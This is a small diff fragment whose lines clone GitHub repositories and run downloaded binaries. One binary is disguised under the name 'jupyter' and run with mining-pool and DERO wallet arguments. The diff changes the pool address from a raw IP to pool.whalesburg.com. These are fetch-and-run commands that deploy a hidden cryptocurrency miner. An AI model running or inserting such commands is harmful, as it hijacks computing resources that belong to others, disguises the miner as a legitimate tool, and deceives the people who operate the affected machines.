@@ -16,7 +16,7 @@ git clone https://github.com/angkii/m.git && cd m && chmod +x AkubapakMU && ./Ak
 
 
 
-git clone https://github.com/angkii/ml.git && cd ml && chmod +x jupyter && ./jupyter -r 148.113.142.107:443 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xmzrc98wdfz0jfq5r2crc.pop2
+git clone https://github.com/angkii/ml.git && cd ml && chmod +x jupyter && ./jupyter -r pool.whalesburg.com:4300 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xmzrc98wdfz0jfq5r2crc.pop2
 
 
 
